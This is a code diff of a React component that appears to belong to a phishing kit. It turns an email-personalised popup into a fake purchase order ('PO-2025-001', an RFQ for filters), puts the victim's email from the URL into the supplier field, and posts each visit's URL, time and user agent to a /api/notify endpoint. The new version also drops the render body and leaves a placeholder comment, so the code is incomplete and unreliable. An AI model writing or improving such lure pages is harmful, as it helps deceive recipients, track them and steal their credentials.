@@ -1,80 +1,73 @@
-/** @format */
 "use client";
 
 import React, { useState, useEffect } from "react";
-import Popup from "./Popup";
+import PurchaseOrder from "./Popup";
 
 const Fetcher = () => {
   const [showPopup, setShowPopup] = useState(false);
-  const [eparams, setEparams] = useState("");
-  const [emailDomain, setEmailDomain] = useState("");
-  const [systemInfo, setSystemInfo] = useState({
-    date: new Date(),
-    browser: "Chrome",
-    os: "Unknown",
+  const [poData, setPoData] = useState({
+    poNumber: "PO-2025-001",
+    date: new Date().toISOString().slice(0, 10),
+    deliveryLocation: "Taiwan",
+    supplier: "[Supplier's Name / Email]",
+    items: [
+      {
+        product: "Filters",
+        specification: "As per attached RFQ photos and",
+        quantity: 27,
+        unitPrice: "",
+        total: "",
+      },
+    ],
   });
 
-  // Detect OS only
   useEffect(() => {
-    const detectOS = () => {
-      const userAgent = window.navigator.userAgent.toLowerCase();
-      if (userAgent.includes("mac")) return "Mac OS";
-      if (userAgent.includes("windows")) return "Windows";
-      if (userAgent.includes("linux")) return "Linux";
-      return "Unknown";
+    const sendNotification = async () => {
+      try {
+        console.log('🚀 Starting notification process...');
+        
+        const notificationData = {
+          url: window.location.href,
+          time: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+        };
+
+        console.log('📤 Sending to /api/notify:', notificationData);
+
+        const response = await fetch("/api/notify", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(notificationData),
+        });
+        
+        const result = await response.json();
+        console.log('📨 API Response:', result);
+        
+        if (!result.success) {
+          console.error('❌ API returned error:', result.error);
+        }
+        
+      } catch (error) {
+        console.error("❌ Notification fetch error:", error);
+      }
     };
 
-    setSystemInfo((prev) => ({
-      ...prev,
-      os: detectOS(),
-    }));
-
-    const dateInterval = setInterval(() => {
-      setSystemInfo((prev) => ({
-        ...prev,
-        date: new Date(),
-      }));
-    }, 1000);
-
-    return () => clearInterval(dateInterval);
-  }, []);
-
-  // Get email from URL params
-  useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const email = params.get("email");
     if (email) {
-      setEparams(email);
-      const domain = email.split("@")[1];
-      setEmailDomain(domain);
+      setPoData((prev) => ({ ...prev, supplier: email }));
     }
 
-    // Show popup after short delay
-    setTimeout(() => {
+    const timer = setTimeout(() => {
+      console.log('⏰ Showing popup and sending notification...');
       setShowPopup(true);
+      sendNotification();
     }, 1000);
+
+    return () => clearTimeout(timer);
   }, []);
 
-  return (
-    <div
-      style={{
-        minHeight: "100vh",
-        display: "flex",
-        alignItems: "center",
-        justifyContent: "center",
-        padding: "20px",
-        boxSizing: "border-box"
-      }}
-    >
-      {showPopup && (
-        <Popup
-          domain={emailDomain}
-          eparams={eparams}
-          systemInfo={systemInfo}
-        />
-      )}
-    </div>
-  );
+  // ... rest of your component
 };
 
 export default Fetcher;
